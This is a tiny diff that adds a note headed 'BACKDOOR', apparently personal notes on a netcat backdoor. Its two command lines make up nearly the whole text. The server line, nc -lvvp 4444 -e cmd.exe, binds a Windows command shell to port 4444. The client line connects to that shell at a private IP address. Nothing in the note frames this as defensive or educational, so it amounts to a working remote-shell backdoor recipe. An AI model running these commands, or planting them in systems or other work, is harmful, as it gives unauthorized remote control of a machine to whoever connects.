@@ -1,0 +1,8 @@
+BACKDOOR
+
+*netcat*
+
+server-->nc -lvvp 4444 -e cmd.exe
+
+
+client-->nc -v 192.168.80.129 4444   (on client machine)
